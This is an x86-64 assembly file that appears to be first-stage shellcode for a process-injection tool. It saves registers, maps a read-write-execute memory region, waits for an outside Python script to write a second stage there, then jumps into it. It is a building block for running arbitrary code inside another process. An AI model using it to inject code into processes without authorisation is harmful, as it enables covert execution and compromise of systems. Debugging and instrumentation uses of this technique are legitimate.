.intel_syntax noprefix
.globl _start
_start:
	// push all the things
	pushf
	push rax
	push rbx
	push rcx
	push rdx
	push rbp
	push rsi
	push rdi
	push r8
	push r9
	push r10
	push r11
	push r12
	push r13
	push r14
	push r15
	
	// allocate a new block of memory using mmap
	mov rax, 9              					# SYS_MMAP
	xor rdi, rdi            					# start address
	mov rsi, [VARIABLE:STAGE2_SIZE:VARIABLE]  	# len
	mov rdx, 0x7            					# prot (rwx)
	mov r10, 0x22           					# flags (MAP_PRIVATE | MAP_ANONYMOUS)
	mov r8, -1             						# fd
	xor r9, r9              					# offset 0
	syscall
	mov r15, rax            					# save mmap addr
	
	// store the sys_nanosleep timer data
	mov rbx, 1
	mov rcx, 1
	push rbx
	push rcx
	mov r13, rsp
	
	// overwrite self at RSP address with 0x00000000
	// and RSP + 8 with the address returned by mmap
	// so that the Python script knows it can write stage 2 to memory
	push r15

	xor rax, rax
	mov rax, 0
	push rax
	
	// wait for value at RSP to be 0x00000001 before proceeding
wait_for_script:

	pop rax
	cmp rax, 1
	je launch_stage2
	push rax
	
	// sleep 1 second
	mov rax, 35

	mov rdi, r13

	lea rsi, [rbp]
	xor rsi, rsi
	syscall
	
	jmp wait_for_script

launch_stage2:
	pop rax
	pop rcx
	pop rbx
	
	// restored backed-up data
	//mov [rip], varBackupData1[rip]
	//mov [rip + 8], varBackupData2[rip]
	pop rax
	pop rax
	
	// jump to stage2
	jmp r15

timespec_data:
	.byte 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0xe9, 0x4f, 0x34, 0x7f, 0x00, 0x00
dmsg:
	.ascii "FEDCBA987654321\0"
newline:
	.ascii "\n\0"
format_hex:
	.ascii "DEBUG: 0x%llx\n\0"
varBackupData1:
	#.space 16
	.quad 0
varBackupData2:
	#.space 16
	.quad 0